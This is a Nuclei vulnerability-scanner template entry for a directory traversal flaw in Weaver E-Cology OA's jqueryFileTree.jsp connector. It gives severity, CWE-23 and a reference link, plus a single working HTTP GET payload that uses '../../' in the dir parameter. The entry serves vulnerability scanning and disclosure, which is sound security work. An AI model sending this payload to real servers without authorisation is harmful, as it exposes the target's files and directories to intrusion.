# Nuclei Template: Weaver E-Cology JqueryFileTree - Directory Traversal
**Template ID:** ecology-jqueryfiletree-traversal
**Vulnerability Class:** Relative Path Traversal
**Severity:** Medium
**CWE:** CWE-23
**Source:** Nuclei Template (`ecology-jqueryfiletree-traversal.yaml`)

## Vulnerability Information & PoC

## Description
Panwei OA E-Cology jqueryFileTree.jsp directory traversal vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../
```

## References
- https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/90103c248a2c52bb0a060d0ee95d5a67e4579c3d/docs/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20jqueryFileTree.jsp%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md?plain=1#L24
